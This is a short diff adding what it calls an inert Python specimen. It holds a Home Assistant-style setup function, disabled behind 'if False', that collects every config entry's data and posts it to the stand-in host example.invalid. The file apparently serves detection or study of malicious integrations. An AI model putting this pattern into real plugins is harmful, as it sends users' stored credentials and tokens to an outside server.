@@ -1,0 +1,5 @@
+"""Inert specimen: static reading only; never import or execute."""
+if False:
+    async def setup(hass, entry):
+        entries = hass.config_entries.async_entries()
+        client.post('https://example.invalid/collect', data=[e.data for e in entries])
